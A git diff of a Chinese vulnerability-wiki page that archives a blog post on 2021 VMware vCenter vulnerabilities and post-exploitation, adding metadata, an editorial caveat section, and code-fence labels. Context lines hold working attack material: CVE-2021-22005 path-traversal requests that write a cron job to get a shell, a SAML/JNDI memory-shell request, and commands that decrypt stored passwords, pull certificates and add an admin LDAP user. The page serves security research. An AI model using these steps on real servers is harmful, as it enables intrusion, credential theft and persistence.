@@ -1,8 +1,57 @@
 ---
-cve: "CVE-2021-22005"
+title: "vCenter2021 几个漏洞及后渗透 daidaitiehanhan's blog"
+product: "VMware vCenter Server专题"
+record_type: "vulnerability"
+review_status: "text-reviewed"
+verification_status: "not-reproduced"
+content_status: "needs-review"
+identifier_status: "unknown"
+primary_identifiers: ""
+referenced_identifiers: "CVE-2021-22005"
+identifier_role: "reference"
+source_url: "https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/#CVE-2021-22005"
+source_status: "recorded"
+prerequisites: "原文未完整说明身份权限、部署配置和可达性；不能假定匿名、默认开启或所有版本适用。"
+side_effects: "含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。; 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。; 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。"
+id: "vw-90bc5bded25cd13e15245980"
+entity_id: "ve-90bc5bded25cd13e15245980"
+schema_version: "1"
 ---
 
-# vCenter2021 几个漏洞及后渗透   daidaitiehanhan's blog
+# vCenter2021 几个漏洞及后渗透 daidaitiehanhan's blog
+
+<!-- vulwiki-editorial:start -->
+## 校订与适用边界
+
+
+### 本次正文校订
+
+- 按实际内容修正 7 处代码围栏语言标记，保留其中方法与请求内容。
+
+### 尚未解决的证据缺口
+
+以下限制仍适用于后文历史材料；相关版本、结果或修复结论不能据此视为已验证：
+
+- 元数据仅22005，包含S2-045/21972/21985/3156/Log4j多个独立问题及后渗透
+- Spring XML bean全部id/class缺失且property语法损坏不是可用payload
+- authorized_keys写公钥非私钥
+- 7u3j在2022文语境是否误写6u3j需核，不能推为仍受21985
+- CIEP应CEIP
+- json后缀cron可执行性取决crond命名规则需验证
+- 22005 Windows6.7不影响说明值得保留
+- SAML签名材料/重置密码/LDAP新增/SSH/剪贴板/克隆快照为不同修改与业务影响，须拆操作步骤和回滚
+- 与打法总结共享章节保留原始来源与数据库细节
+
+### 操作风险与资料使用
+
+- 含计划任务、启动项或 SSH 授权文件写入：会改变后续执行或登录行为。测试前备份原文件，结束后恢复原内容、权限与属主，不覆盖生产文件。
+- 含落盘脚本或账户创建：会留下持久状态。记录本次生成的路径或账户，测试后清理这些对象并撤销关联令牌；不要删除既有业务对象。
+- 涉及 LDAP/RMI/DNS/HTTP 外带：回连只证明相应网络交互，不能单独证明命令执行；使用自控接收端，避免把日志、凭据或真实业务数据发送给第三方。
+
+本页为文本校订，未执行代码、PoC 或目标请求；原图仅保留引用，未据此确认复现成功。
+<!-- vulwiki-editorial:end -->
+
+## 技术正文与历史材料
 
 <meta name="referrer" content="no-referrer"/>
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [daidaitiehanhan.github.io](https://daidaitiehanhan.github.io/2022/04/18/vCenter2021%E5%87%A0%E4%B8%AA%E6%BC%8F%E6%B4%9E%E5%8F%8A%E5%90%8E%E6%B8%97%E9%80%8F/#CVE-2021-22005)
@@ -176,7 +225,7 @@ bcel 执行 java 代码的 xml，这样注内存马更方便。
 
 可以写入任意文件，但是写入后的文件后缀固定是. json。_i 参数控制可跳跃的路径，最终写入的文件路径如果存在就会把内容追加进文件，不存在就会创建文件，但当如果我们写入的文件名是因某些因素被删除过的文件名，则无法正常写文件。
 
-```
+```http
 POST /analytics/telemetry/ph-stg/api/hyper/send?_c=&_i=/../../../../../../tmp/okok HTTP/1.1
 Host: 172.16.64.143
 Connection: close
@@ -193,7 +242,7 @@ ok
 
 由于只能写入. json 后缀的文件，所以略微有点鸡肋，但是对于 linux 的机器我们可以写入计划任务来执行写 shell 的操作
 
-```
+```http
 POST /analytics/telemetry/ph-stg/api/hyper/send?_c=&_i=/../../../../../../etc/cron.d/appl3 HTTP/1.1
 Host: 172.16.64.143
 Connection: close
@@ -221,7 +270,7 @@ VelocityHelper.executeVelocityExpression 触发 velocity 表达式执行。
 
 可以直接写入内存马，且 vcenter 默认是 tomcat，可以尝试利用 tomcatbypass 模块绕过 jndi 高版本限制写入内存马
 
-```
+```http
 GET /websso/SAML2/SSO/vsphere.local?SAMLRequest= HTTP/1.1
 Host: 172.16.64.143
 User-Agent: curl/7.64.1
@@ -315,7 +364,7 @@ Linux:  /etc/vmware-vpx/ssl/symkey.dat
 
 使用脚本 [decrypt.py](https://github.com/shmilylty/vhost_password_decrypt/blob/main/decrypt.py) 解密拿到明文密码
 
-```
+```shell
 python3 decrypt.py symkey.dat password.enc password.txt
 ```
 
@@ -359,7 +408,7 @@ C:\ProgramData\VMware\vCenterServer\data\vmdird\data.mdb
 
 先上传 [vCenter_ExtraCertFromMdb.py](https://github.com/3gstudent/Homework-of-Python/blob/master/vCenter_ExtraCertFromMdb.py) 到目标 vcenter 服务器上
 
-```
+```shell
 python vCenter_ExtraCertFromMdb.py /storage/db/vmware-vmdir/data.mdb
 ```
 
@@ -393,7 +442,7 @@ C:\Program Files\VMware\vCenter Server\vmdird\vdcadmintool.exe
 
 先增加用户
 
-```
+```shell
 python vCenterLDAP_Manage.py adduser
 ```
 
@@ -403,7 +452,7 @@ python vCenterLDAP_Manage.py adduser
 
 然后把用户加进管理员组
 
-```
+```shell
 python vCenterLDAP_Manage.py addadmin
 ```
 
